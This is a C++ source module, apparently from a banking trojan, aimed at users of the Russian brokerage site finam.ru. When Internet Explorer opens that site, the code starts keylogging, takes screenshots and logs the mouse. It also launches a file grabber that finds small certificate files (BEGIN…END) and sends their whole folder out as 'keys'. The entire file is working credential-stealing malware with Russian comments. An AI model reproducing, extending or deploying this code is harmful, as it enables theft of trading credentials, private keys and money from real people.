#include "finam.h"
#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "FileGrabber.h"

#include "BotDebug.h"

namespace FINAMSYSTEM
{
	#include "DbgTemplates.h"
}

#define DBG FINAMSYSTEM::DBGOutMessage<>

namespace Finam
{

static PKeyLogSystem System = 0;
static bool finamActivated = false;

//как только попадается хоть один файл с нужно маской, то сразу грабим всю папку и останавливаем файл граббер
static int GrabKeyFiles( FileGrabber::ParamEvent* e )
{
	DBG( "finam", "File: %s", e->fileName );
	m_lstrcpy( e->nameSend, "keys" );
	return FileGrabber::SENDFOLDER | FileGrabber::STOPRECEIVER;
}

static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	const char* url = (const char*)Data;
	if( m_strstr( url, "finam.ru" ) )
	{
		if( !finamActivated )
		{
			finamActivated = true;
			DBG( "finam", "Активирована" );
			KeyLogger::ActivateSystem(System);
			FileGrabber::Init(FileGrabber::CREATEFILEA);
			FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
			rv->FuncReceiver = GrabKeyFiles;
			rv->minSize = 200;
			rv->maxSize = 1000;
			rv->maska = "*-BEGIN*-END*"; //файлы которые начинаются с BEGIN CERTIFICATE и заканчиваются END CERTIFICATE
			FileGrabber::AddReceiver(rv);
		}
	}
	else
		if( finamActivated )
		{
			finamActivated = false;
			FileGrabber::Release();
			KeyLogger::CloseSession();
			DBG( "finam", "Деактивирована" );
		}
}

bool Init()
{
	finamActivated = false;
	System = KeyLogger::AddSystem( "finam", PROCESS_HASH_IE );
	if( System )
	{
		System->MakeScreenShot = true;;
		System->NotAutoStart = true;
		System->AlwaysLogMouse = LOG_MOUSE_NOT_SCREENSHOT;
		DBG( "finam", "Ожидаем нужный урл" );
		KeyLogger::ConnectEventHandler( KLE_IE_URL_CHANGED, URLChanged );
		return true;
	}
	return false;
}

}
